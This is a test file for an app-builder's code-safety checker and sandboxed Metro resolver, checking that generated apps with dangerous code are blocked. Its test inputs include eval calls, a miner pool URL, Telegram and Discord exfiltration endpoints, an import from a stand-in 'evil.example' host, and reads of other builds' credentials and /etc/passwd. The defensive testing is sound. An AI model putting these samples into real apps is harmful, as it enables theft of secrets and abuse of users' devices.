import { mkdirSync, mkdtempSync, symlinkSync, writeFileSync } from "node:fs";
import { createRequire } from "node:module";
import os from "node:os";
import path from "node:path";
import { describe, expect, it } from "vitest";
import { checkCodeSafety } from "@/lib/code-safety";
import { CONTAINED_METRO_CONFIG, expoProjectFiles } from "@/lib/expo-project";
import { InputError, parseProject } from "@/lib/eas/input";
import { emptyListing } from "@/lib/storage";
import { SAFETY_PREFIX, validateApp } from "@/lib/validate";

const require = createRequire(import.meta.url);
const APP = "import React from 'react';\nimport { Text } from 'react-native';\nexport default function App() { return <Text>Hi</Text>; }\n";
const flagged = (code: string, file = "App.js") => checkCodeSafety({ [file]: code }).map((f) => f.message);

describe("code safety check", () => {
  it.each([
    ["eval", "const r = eval(source);", /eval\(\)/],
    ["new Function", "const f = new Function('a', 'return a');", /new Function/],
    ["Function from text", "const f = Function('return this')();", /new Function/],
    ["string timers", "setTimeout('alert(1)', 10);", /setTimeout/],
    ["WebAssembly", "WebAssembly.instantiate(bytes);", /WebAssembly/],
    ["workers", "const w = new Worker('miner.js');", /background scripts/],
    ["miners", "const pool = 'stratum+tcp://pool.example:3333';", /crypto-mining/],
    ["Telegram bots", "fetch('https://api.telegram.org/bot123:abc/sendMessage')", /Telegram bot/],
    ["Discord webhooks", "fetch('https://discord.com/api/webhooks/1/abc', { method: 'POST' })", /Discord webhook/],
    ["require.context", "const all = require.context('./', true);", /require\.context/],
    ["computed require", "const m = require(name);", /plain quoted path/],
    ["template require", "const m = require(`../../x`);", /plain quoted path/],
    ["computed import()", "const m = await import(url);", /plain quoted path/],
    ["absolute import", "import secrets from '/etc/secrets.json';", /outside the app/],
    ["escaping import", "import creds from '../../other-build/credentials.json';", /outside the app/],
    ["escaping require", "const c = require('./node_modules/../../../x.json');", /outside the app/],
    ["URL import", "import x from 'https://evil.example/x.js';", /outside the app/],
    ["minified code", `const a = 1;${" ".repeat(10)}${"x=1;".repeat(1000)}`, /minified/],
    ["obfuscated names", Array.from({ length: 6 }, (_, i) => `var _0x${(0xa1b2 + i).toString(16)} = ${i};`).join("\n"), /obfuscated/],
    ["hex escapes", `const s = "${"\\x41".repeat(41)}";`, /escape codes/],
    ["char codes", "const s = String.fromCharCode(104,101,108,108,111,32,119,111,114,108,100);", /character codes/],
    ["encoded blob", `const payload = "${"QUJD".repeat(1300)}";`, /encoded data/],
  ])("blocks %s", (_name, code, message) => {
    expect(flagged(code).join("\n")).toMatch(message);
  });

  it("leaves normal app code alone", () => {
    const code = [
      APP,
      "import { theme } from './src/theme';",
      "import AsyncStorage from '@react-native-async-storage/async-storage';",
      "const retrieval = (x) => x; retrieval(1);",
      "const t = <Text>Tap import (beta) to evaluate(1) ideas from 'friends'</Text>;",
      "setTimeout(() => refresh(), 1000);",
      "const res = await fetch('https://api.open-meteo.com/v1/forecast?latitude=1&longitude=2');",
      `const logo = "data:image/png;base64,${"A".repeat(6000)}";`,
      "const s = String.fromCharCode(65);",
    ].join("\n");
    expect(checkCodeSafety({ "App.js": code, "src/theme.js": "export const theme = {};", "src/data.json": `{"blob":"${"Q".repeat(9000)}"}` })).toEqual([]);
    expect(flagged("import { theme } from '../theme';", "src/screens/Home.js")).toEqual([]);
  });

  it("is part of the automatic check, so the AI removes it", () => {
    const issues = validateApp({ "App.js": `${APP}\neval('1');` });
    expect(issues.some((i) => i.message.startsWith(SAFETY_PREFIX) && /eval/.test(i.message))).toBe(true);
  });

  it("blocks cloud builds and phone previews of unsafe code on the server", () => {
    const listing = { ...emptyListing("Habit Hero"), bundleId: "com.acme.habithero" };
    expect(() => parseProject({ files: { "App.js": APP }, listing })).not.toThrow();
    expect(() => parseProject({ files: { "App.js": `${APP}\nconst c = require('../../build-x/app/credentials.json');` }, listing })).toThrow(InputError);
    expect(() => parseProject({ files: { "App.js": `${APP}\neval('1');` }, listing })).toThrow(/won't build/);
  });
});

describe("server-side bundling is confined to the app", () => {
  it("is only added for phone previews, which bundle on the server", () => {
    const project = { id: "p", name: "A", prompt: "", files: { "App.js": APP }, messages: [], listing: emptyListing("A"), createdAt: 0, updatedAt: 0 };
    const link = { projectId: "0b6e6a8e-3f5e-4c47-9d68-6e0d3c1f2a11", owner: "a", slug: "a" };
    expect(expoProjectFiles(project, { link, expoGo: true })["metro.config.js"]).toBe(CONTAINED_METRO_CONFIG);
    expect(expoProjectFiles(project, { link })).not.toHaveProperty("metro.config.js");
  });

  it("the Metro resolver refuses files outside the app and its packages", () => {
    const work = mkdtempSync(path.join(os.tmpdir(), "appmaker-metro-"));
    const app = path.join(work, "build-1", "app");
    const deps = path.join(work, "expo-deps", "node_modules");
    mkdirSync(path.join(deps, "expo"), { recursive: true });
    mkdirSync(path.join(deps, "react-native"), { recursive: true });
    mkdirSync(path.join(work, "build-2", "app"), { recursive: true });
    mkdirSync(app, { recursive: true });
    // A stand-in for expo/metro-config: the real one needs the full Expo install.
    writeFileSync(path.join(deps, "expo", "metro-config.js"), "exports.getDefaultConfig = () => ({ resolver: {} });");
    writeFileSync(path.join(deps, "react-native", "index.js"), "");
    writeFileSync(path.join(app, "App.js"), APP);
    writeFileSync(path.join(work, "build-2", "app", "credentials.json"), "{}");
    symlinkSync(deps, path.join(app, "node_modules"), "dir");
    writeFileSync(path.join(app, "metro.config.js"), CONTAINED_METRO_CONFIG);
    const config = require(path.join(app, "metro.config.js"));

    const resolveTo = (filePath: string) => (moduleName: string) =>
      config.resolver.resolveRequest({ resolveRequest: () => ({ type: "sourceFile", filePath }) }, moduleName, "ios");
    expect(() => resolveTo(path.join(app, "App.js"))("./App")).not.toThrow();
    expect(() => resolveTo(path.join(app, "node_modules", "react-native", "index.js"))("react-native")).not.toThrow();
    expect(() => resolveTo(path.join(deps, "react-native", "index.js"))("react-native")).not.toThrow();
    expect(() => resolveTo(path.join(work, "build-2", "app", "credentials.json"))("../../build-2/app/credentials.json")).toThrow(
      /Blocked import outside the app/,
    );
    expect(() => resolveTo(path.join(app, "node_modules", "..", "..", "..", "build-2", "app", "credentials.json"))("x")).toThrow(/Blocked/);
    expect(() => resolveTo("/etc/hostname")("/etc/hostname")).toThrow(/Blocked/);
    expect(() =>
      config.resolver.resolveRequest({ resolveRequest: () => ({ type: "assetFiles", filePaths: ["/etc/passwd.png"] }) }, "/etc/passwd.png", "ios"),
    ).toThrow(/Blocked/);
    expect(config.resolver.resolveRequest({ resolveRequest: () => ({ type: "empty" }) }, "x", "ios")).toEqual({ type: "empty" });
  });
});
